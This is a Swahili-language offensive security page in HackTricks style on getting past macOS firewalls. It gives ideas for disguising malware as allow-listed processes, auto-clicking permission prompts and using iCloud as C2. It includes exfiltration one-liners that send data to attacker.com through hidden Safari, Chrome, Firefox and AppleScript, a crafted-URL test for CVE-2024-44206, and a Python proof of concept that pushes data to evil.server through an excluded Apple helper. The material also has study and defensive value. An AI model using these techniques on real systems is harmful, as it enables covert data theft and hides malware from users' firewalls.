# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Mbinu zilizopatikana

Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya programu za firewall za macOS.

### Kutumia majina ya orodha ya ruhusa

- Kwa mfano, kuita malware kwa majina ya michakato maarufu ya macOS kama **`launchd`**

### Kibonyezi bandia

- Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **ibonyeze ruhusu**

### **Tumia binaries zilizotiwa saini na Apple**

- Kama **`curl`**, lakini pia wengine kama **`whois`**

### Tovuti maarufu za apple

Firewall inaweza kuwa inaruhusu muunganisho kwa tovuti maarufu za apple kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.

### Kupanua kwa ujumla

Mawazo mengine ya kujaribu kupita firewalls

### Angalia trafiki inayoruhusiwa

Kujua trafiki inayoruhusiwa kutakusaidia kubaini tovuti ambazo zinaweza kuwa kwenye orodha ya ruhusa au programu zipi zinazoruhusiwa kuzifikia.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia DNS

Marekebisho ya DNS yanafanywa kupitia **`mdnsreponder`** programu iliyosainiwa ambayo labda itaruhusiwa kuwasiliana na seva za DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia programu za kivinjari

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia sindikizo za michakato

Ikiwa unaweza **kuiingiza msimbo katika mchakato** ambao unaruhusiwa kuungana na seva yoyote unaweza kupita ulinzi wa firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Uhalifu wa hivi karibuni wa kupita firewall ya macOS (2023-2025)

### Kupita chujio cha maudhui ya wavuti (Screen Time) – **CVE-2024-44206**
Mnamo Julai 2024 Apple ilirekebisha hitilafu muhimu katika Safari/WebKit ambayo ilivunja “Chujio cha maudhui ya wavuti” kinachotumika na udhibiti wa wazazi wa Screen Time.
URI iliyoundwa kwa njia maalum (kwa mfano, yenye “://” iliyokodishwa mara mbili) haitambuliwi na ACL ya Screen Time lakini inakubaliwa na WebKit, hivyo ombi linawekwa nje bila kuchujwa. Mchakato wowote unaoweza kufungua URL (ikiwemo msimbo ulio katika sanduku au usio na saini) unaweza hivyo kufikia maeneo ambayo yamezuiwa waziwazi na mtumiaji au profaili ya MDM.

Jaribio la vitendo (sistimu isiyo na marekebisho):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Kosa la agizo la Filter ya Packet (PF) katika macOS 14 “Sonoma”
Wakati wa mzunguko wa beta wa macOS 14, Apple ilianzisha kurudi nyuma katika kifuniko cha nafasi ya mtumiaji kilichozunguka **`pfctl`**. 
Sheria ambazo ziliongezwa kwa neno la `quick` (linalotumiwa na swichi nyingi za VPN) zilipuuziliwa mbali kimya, na kusababisha uvujaji wa trafiki hata wakati GUI ya VPN/firewall iliripoti *imezuiwa*. Kosa hilo lilithibitishwa na wauzaji kadhaa wa VPN na kurekebishwa katika RC 2 (ujenzi 23A344).

Kukagua uvujaji haraka:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu ~50 Apple binaries kama **`nsurlsessiond`** na App Store kupita firewall zote za socket-filter zilizotekelezwa na mfumo wa Network Extension (LuLu, Little Snitch, nk.).
Malware inaweza tu kuanzisha mchakato ulioondolewa—au kuingiza msimbo ndani yake—na kupitisha trafiki yake mwenyewe kupitia socket ambayo tayari inaruhusiwa. Apple iliondoa kabisa orodha ya kuondolewa katika macOS 11.2, lakini mbinu hii bado inahusiana kwenye mifumo ambayo haiwezi kuboreshwa.

Mfano wa uthibitisho wa dhana (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Vidokezo vya zana za macOS za kisasa

1. Kagua sheria za sasa za PF ambazo moto wa GUI unazalisha:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Tambua binaries ambazo tayari zina *outgoing-network* entitlement (inayofaa kwa piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Jisajili kimaandishi mwenyewe mfiltri wa maudhui ya Network Extension katika Objective-C/Swift.
Mfano mdogo usio na mizizi ambao unapeleka pakiti kwa soketi ya ndani unapatikana katika msimbo wa chanzo wa **LuLu** wa Patrick Wardle.

## Marejeleo

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
